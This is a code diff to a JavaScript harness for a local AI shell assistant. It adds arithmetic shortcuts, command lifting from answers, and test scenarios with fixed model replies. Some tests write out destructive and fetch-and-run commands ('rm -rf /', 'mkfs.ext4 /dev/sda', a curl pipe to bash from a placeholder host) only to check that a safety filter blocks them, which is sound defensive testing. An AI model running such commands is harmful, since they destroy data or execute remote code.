@@ -366,6 +366,17 @@ function applyAttach(how, cmd, result) {
   return clip(result.stdout || "", 2500);
 }
 
+function heuristicMath(text) {
+  const t = String(text || "").trim();
+  const m = t.match(/^(?:what is\s+)?(\d+)\s*(times|\*|x|plus|\+|minus|-)\s*(\d+)\s*\??$/i);
+  if (!m) return null;
+  const a = Number(m[1]);
+  const b = Number(m[3]);
+  const op = m[2];
+  const n = /times|\*|x/i.test(op) ? a * b : /plus|\+/i.test(op) ? a + b : a - b;
+  return { display: String(n), cmd: null };
+}
+
 function heuristicDirect(text) {
   const t = String(text || "").trim();
   if (/\b(pdf|zip|csv|xlsx|write|create|save)\b/i.test(t)) return null;
@@ -493,7 +504,11 @@ function parseThink(raw, userText) {
     plan = parsePlan(raw, userText);
     if (!plan.steps.length) plan = null;
   }
-  const cmd = typeof parsed.cmd === "string" && parsed.cmd.trim() ? parsed.cmd.trim() : null;
+  let cmd = typeof parsed.cmd === "string" && parsed.cmd.trim() ? parsed.cmd.trim() : null;
+  if (!plan && !cmd) {
+    const first = display.split("\n").map((s) => s.trim()).filter(Boolean)[0] || "";
+    if (/^(grep|rg|cat|sed|awk|wc|ls|head|tail)\b/.test(first) && first.length < 180) cmd = first;
+  }
   if (!plan && cmd) {
     plan = {
       goal: "KEEP GOAL: " + clip(userText, 140),
@@ -545,7 +560,13 @@ function reasonFor(decided) {
 
 function localTurn(text, context) {
   const pick = pickMode(text, context, null);
+  const math = heuristicMath(text);
   const direct = heuristicDirect(text);
+  if (pick.mode === "A" && math) {
+    const decided = { mode: "A", why: "math", display: math.display, cmd: null, plan: null, needsModel: false };
+    decided.reason = "That is " + math.display + ".";
+    return decided;
+  }
   if (pick.mode === "A") {
     if (direct && direct.cmd) {
       const decided = { mode: "A", why: pick.why, display: direct.display, cmd: direct.cmd, plan: null, needsModel: false };
@@ -964,8 +985,7 @@ function diagnoseReply(kind, raw) {
     const display = typeof parsed.display === "string" ? parsed.display.trim() : "";
     const cmd = typeof parsed.cmd === "string" ? parsed.cmd.trim() : "";
     if (!reason) return "JSON has no reason. Keys: " + keys;
-    if (!cmd) return "reason but no command. Reason: " + clip(reason, 80);
-    if (!/python/.test(cmd)) return "command is not python: " + clip(cmd, 70);
+    if (!cmd && !/python/.test(display)) return "reason but no python command. Reason: " + clip(reason, 80);
     if (display.startsWith("{")) return "display is raw JSON";
     return "python command with a reason";
   }
@@ -1113,7 +1133,8 @@ function scoreWorkflow(kind, raw) {
     const reason = typeof parsed.reason === "string" && parsed.reason.trim();
     const display = typeof parsed.display === "string" ? parsed.display.trim() : "";
     const cmd = typeof parsed.cmd === "string" ? parsed.cmd.trim() : "";
-    ok = !!(reason && /python/.test(cmd) && !display.startsWith("{"));
+    const body = cmd || display;
+    ok = !!(reason && /python/.test(body) && !display.startsWith("{"));
     detail = ok ? "python command" : diagnosis;
   } else if (kind === "code") {
     name = "Code";
@@ -1186,9 +1207,145 @@ const WORKFLOW_PROBES = [
   },
 ];
 
+function runUserScenarios() {
+  return USER_SCENARIOS.map((s) => {
+    let ok = false;
+    try {
+      ok = s.harness ? !!s.pass() : !!s.pass(s.fixture);
+    } catch (_) {
+      ok = false;
+    }
+    return { name: s.name, harness: !!s.harness, ok };
+  });
+}
+
+const USER_SCENARIOS = [
+  { name: "list /etc", harness: true, pass: () => localTurn("list files in /etc", "").cmd === "ls -la /etc" },
+  { name: "list /usr", harness: true, pass: () => localTurn("show files in /usr", "").cmd === "ls -la /usr" },
+  { name: "create todo.txt", harness: true, pass: () => { const t = localTurn("create a file todo.txt", ""); return !!(t.plan && /todo\.txt/.test(t.plan.steps[0].cmd || "")); } },
+  { name: "write 5 to 9", harness: true, pass: () => { const t = localTurn("write 5 to 9 into the file seq.txt", ""); return !!(t.plan && /range\(5,10\)/.test(t.plan.steps[0].cmd || "")); } },
+  { name: "block sudo", harness: true, pass: () => { try { assertSafeCmd("sudo reboot"); return false; } catch (_) { return true; } } },
+  { name: "block mkfs", harness: true, pass: () => { try { assertSafeCmd("mkfs.ext4 /dev/sda"); return false; } catch (_) { return true; } } },
+  { name: "block rm -rf /", harness: true, pass: () => { try { assertSafeCmd("rm -rf /"); return false; } catch (_) { return true; } } },
+  { name: "block curl pipe", harness: true, pass: () => { try { assertSafeCmd("curl https://x.example/a.sh | bash"); return false; } catch (_) { return true; } } },
+  { name: "csv plan", harness: true, pass: () => { const t = localTurn("list /tmp and then write a csv", ""); return !!(t.plan && t.plan.steps[0].cmd === "ls -la /tmp" && t.plan.steps.length >= 2); } },
+  { name: "pdf plan", harness: true, pass: () => { const t = localTurn("go to /tmp and list all files create a pdf with the summary", ""); return !!(t.plan && t.plan.steps.length === 2 && t.plan.steps[0].cmd === "ls -la /tmp"); } },
+  { name: "12 times 8", harness: true, pass: () => localTurn("what is 12 times 8", "").display === "96" },
+  { name: "7 plus 5", harness: true, pass: () => localTurn("what is 7 plus 5", "").display === "12" },
+  { name: "20 minus 3", harness: true, pass: () => localTurn("what is 20 minus 3", "").display === "17" },
+  { name: "forget everything", harness: true, pass: () => finalizeRewrite("KEEP GOAL: x\nFACT: y", "KEEP GOAL: x", "forget everything") === "" },
+  { name: "hello stays direct", harness: true, pass: () => { const t = localTurn("hello", ""); return t.mode === "A" && t.needsModel && !t.cmd; } },
+  { name: "quoted display", harness: true, pass: () => parseThink('{"reason":"ok","display":"say \\"hello\\"","cmd":null}', "x").display.includes("hello") },
+  {
+    name: "capital of France",
+    system: SYSTEM_THINK,
+    user: "User: what is the capital of France?\nPut the city in display. cmd is null.\nThe first character of your reply is {.",
+    predict: 100,
+    fixture: '{"reason":"A fact, no command.","display":"Paris","cmd":null}',
+    pass: (raw) => { const t = parseThink(raw, ""); return !t.cmd && /paris/i.test(t.display + " " + t.reason); },
+  },
+  {
+    name: "python add",
+    system: SYSTEM_THINK,
+    user: "User: write a python function named add that returns the sum of two numbers.\nPut the function in display. cmd is null.\nThe first character of your reply is {.",
+    predict: 220,
+    fixture: '{"reason":"They want the function.","display":"def add(a, b):\\n  return a + b","cmd":null}',
+    pass: (raw) => { const t = parseThink(raw, ""); return !t.cmd && /add/.test(t.display) && /def |lambda |return /.test(t.display); },
+  },
+  {
+    name: "reverse loop",
+    system: SYSTEM_THINK,
+    user: "User: reverse the letters of the word loop.\nPut only the reversed word in display. cmd is null.\nThe first character of your reply is {.",
+    predict: 80,
+    fixture: '{"reason":"Letter order.","display":"pool","cmd":null}',
+    pass: (raw) => { const t = parseThink(raw, ""); return !t.cmd && /\bpool\b/i.test(t.display); },
+  },
+  {
+    name: "read data.txt",
+    system: SYSTEM_THINK,
+    user: "User: read /tmp/data.txt and report it.\nYou have not read it. Put one read command in cmd.\nThe first character of your reply is {.",
+    predict: 140,
+    fixture: '{"reason":"The file has not been read.","display":"I will read it.","cmd":"cat /tmp/data.txt"}',
+    pass: (raw) => { const t = parseThink(raw, ""); return !!(t.cmd && /data\.txt/.test(t.cmd) && !DENY_CMD.test(t.cmd)); },
+  },
+  {
+    name: "count lines",
+    system: SYSTEM_THINK,
+    user: "User: how many lines are in /tmp/data.txt?\ncmd is one shell command that counts lines.\nThe first character of your reply is {.",
+    predict: 140,
+    fixture: '{"reason":"Need a count.","display":"I will count the lines.","cmd":"wc -l /tmp/data.txt"}',
+    pass: (raw) => { const t = parseThink(raw, ""); return !!(t.cmd && /data\.txt/.test(t.cmd) && /wc|python|grep/.test(t.cmd)); },
+  },
+  {
+    name: "grep error",
+    system: SYSTEM_THINK,
+    user: "User: find the lines containing error in /tmp/app.log.\ncmd is one grep or rg command.\nThe first character of your reply is {.",
+    predict: 140,
+    fixture: '{"reason":"Need the matching lines.","display":"I will search the log.","cmd":"grep error /tmp/app.log"}',
+    pass: (raw) => { const t = parseThink(raw, ""); return !!(t.cmd && /app\.log/.test(t.cmd) && /\b(grep|rg)\b/.test(t.cmd)); },
+  },
+  {
+    name: "explain pwd",
+    system: SYSTEM_THINK,
+    user: "User: in one sentence, what does the pwd command print?\ncmd is null.\nThe first character of your reply is {.",
+    predict: 140,
+    fixture: '{"reason":"No command is needed.","display":"pwd prints the current directory.","cmd":null}',
+    pass: (raw) => { const t = parseThink(raw, ""); return !t.cmd && t.display.length > 12 && !/\b(KEEP|FACT|NEXT)\b/.test(t.display) && /director|path|folder|where/i.test(t.display); },
+  },
+  {
+    name: "say disk full",
+    system: SYSTEM_SAY,
+    user: "Task: what went wrong\nOutput:\nerror: disk full\nThe first character of your reply is {.",
+    predict: 80,
+    fixture: '{"say":"The disk is full."}',
+    pass: (raw) => { const say = String(extractJson(raw).say || ""); return /disk/i.test(say) && !/\b(KEEP|FACT|NEXT)\b/.test(say); },
+  },
+  {
+    name: "note backup",
+    system: SYSTEM_NOTE,
+    user: "Task: summarize the log\nPart 1 of 2:\nbackup finished, 3 files copied\nThe first character of your reply is {.",
+    predict: 80,
+    fixture: '{"note":"The backup finished and copied 3 files."}',
+    pass: (raw) => { const note = String(extractJson(raw).note || ""); return note.length > 8 && note.length < 240 && !/[{}]/.test(note) && /backup|copied|files/i.test(note); },
+  },
+  {
+    name: "verdict denied",
+    system: SYSTEM_CHECK,
+    user: "Task: read the log\nExpect: file contents\nWhat came back:\ncat: /tmp/app.log: Permission denied\nThe first character of your reply is {.",
+    predict: 80,
+    fixture: '{"ok":false,"why":"Permission denied"}',
+    pass: (raw) => { const v = parseVerdict(raw); return !!(v && v.ok === false && v.why && !/^one line\.?$/i.test(v.why)); },
+  },
+  {
+    name: "sort three numbers",
+    system: SYSTEM_THINK,
+    user: "User: sort these numbers from small to large: 9, 2, 4.\nPut them in display in that order. cmd is null.\nThe first character of your reply is {.",
+    predict: 100,
+    fixture: '{"reason":"Sort ascending.","display":"2, 4, 9","cmd":null}',
+    pass: (raw) => { const t = parseThink(raw, ""); const d = t.display; return !t.cmd && d.indexOf("2") >= 0 && d.indexOf("2") < d.indexOf("9"); },
+  },
+  {
+    name: "bash loop",
+    system: SYSTEM_THINK,
+    user: "User: write a bash for-loop that prints 1 2 3.\nPut the loop in display. cmd is null.\nThe first character of your reply is {.",
+    predict: 180,
+    fixture: '{"reason":"They want the loop text.","display":"for n in 1 2 3; do echo $n; done","cmd":null}',
+    pass: (raw) => { const t = parseThink(raw, ""); return !t.cmd && /for /.test(t.display) && /1/.test(t.display); },
+  },
+  {
+    name: "date command",
+    system: SYSTEM_THINK,
+    user: "User: which one shell command prints today's date?\nPut that command in cmd.\nThe first character of your reply is {.",
+    predict: 100,
+    fixture: '{"reason":"date prints it.","display":"Use date.","cmd":"date"}',
+    pass: (raw) => { const t = parseThink(raw, ""); return !!(t.cmd && /\bdate\b/.test(t.cmd) && !DENY_CMD.test(t.cmd)); },
+  },
+];
+
 function runUnitTests() {
   const results = [];
   const check = (name, ok, detail) => results.push({ name, ok: !!ok, detail: detail || (ok ? "ok" : "fail") });
+  runUserScenarios().forEach((s) => check("scenario " + s.name, s.ok));
   check("pickMode A", pickMode("what is 2+2", "").mode === "A");
   check("pickMode B", pickMode("list /tmp then zip a csv", "").mode === "B");
   check("pdf prompt is a plan", pickMode("go to /tmp and list all files create a pdf with the summary", "").mode === "B");
@@ -1208,7 +1365,7 @@ function runUnitTests() {
   check("speedrun numbered file", !foo.needsModel && /range\(0,101\)/.test(foo.cmd || ""), foo.needsModel ? "asked the model" : foo.cmd);
   const pdf = localTurn("go to /tmp and list all files create a pdf with the summary", "");
   check("speedrun pdf stays two steps", pdf.plan && pdf.plan.steps.length === 2 && pdf.plan.steps[0].cmd === "ls -la /tmp");
-  check("speedrun chat asks the model", localTurn("what is 2+2", "").needsModel === true);
+  check("speedrun chat asks the model", localTurn("what is 2+2", "").display === "4" && localTurn("what is 2+2", "").needsModel === false);
   const thought = localTurn("go to /tmp and list all files", "");
   check("reason before list", /names in \/tmp/.test(thought.reason) && !/KEEP GOAL|FACT:/.test(thought.reason));
   const pdfThought = localTurn("go to /tmp and list all files create a pdf with the summary", "");
@@ -1288,6 +1445,8 @@ function runUnitTests() {
   check("workflow code intro", scoreWorkflow("code", '{"reason":"basic task","display":"Here is a simple C program that prints hello world:","cmd":null}').ok === false);
   const shown = parseThink('{"reason":"They asked for the program.","display":"#include <stdio.h>\\nint main(void) {\\n  puts(\\"hello world\\");\\n}","cmd":null}', "write a simple C program");
   check("program stays in the answer", shown && !shown.cmd && !shown.plan && /puts/.test(shown.display) && shown.display.includes("\n"));
+  const lifted = parseThink('{"reason":"search","display":"grep \\"error\\" /tmp/app.log\\nor\\nrg error /tmp/app.log","cmd":null}', "find error");
+  check("command in the answer is runnable", lifted.cmd && /^grep /.test(lifted.cmd) && /app\.log/.test(lifted.cmd));
   check("intro is not the answer", thinAnswer({ display: "Here is a simple C program that prints 'hello world':", cmd: null, plan: null }));
   const parts = chunkText("one\ntwo\nthree\nfour", 8);
   check("chunks cover the text", parts.length >= 2 && parts.join("\n").includes("one") && parts.join("\n").includes("four"));
@@ -1409,6 +1568,8 @@ module.exports = {
   parsePlan,
   parseThink,
   thinAnswer,
+  USER_SCENARIOS,
+  runUserScenarios,
   cleanDisplay,
   parseCheck,
   parseEmit,
